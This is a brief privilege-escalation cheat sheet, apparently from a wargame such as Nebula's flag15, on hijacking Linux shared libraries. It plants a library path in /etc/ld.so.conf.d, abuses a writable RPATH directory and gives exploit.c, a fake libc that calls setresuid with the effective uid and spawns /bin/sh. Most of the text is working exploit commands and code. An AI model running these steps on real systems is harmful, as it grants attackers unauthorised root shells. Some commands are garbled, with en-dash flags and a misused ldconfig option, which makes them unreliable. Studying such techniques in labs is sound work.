# Shared Library

## Steps

ldconfig

### 1) Identify shared libraries with ldd

    ldd /opt/binary

### 2) Create a library in /tmp and activate the path

    gcc –Wall –fPIC –shared –o vulnlib.so /tmp/vulnlib.c
    echo "/tmp/" > /etc/ld.so.conf.d/exploit.conf && ldconfig -l /tmp/vulnlib.so
    /opt/binary

RPATH

### 1)

    readelf -d flag15 | egrep "NEEDED|RPATH"

### 2) 

    ldd ./flag15 

### 3) By copying the lib into /var/tmp/flag15/ it will be used by the program in this place as specified in the RPATH variable.

    cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/
    ldd ./flag15

### 4) Then create an evil library in /var/tmp with 

    gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6

exploit.c content

    #include<stdlib.h>
    #define SHELL "/bin/sh"
    
    int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
    {
     char *file = SHELL;
     char *argv[] = {SHELL,0};
     setresuid(geteuid(),geteuid(), geteuid());
     execve(file,argv,0);
    }
